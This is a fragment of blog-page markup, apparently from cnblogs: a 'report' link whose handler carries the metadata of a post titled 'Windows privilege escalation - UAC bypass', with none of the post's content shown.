<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18745249', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18745249', title: 'Windows 提权-UAC 绕过' })">举报</a>
</div>
        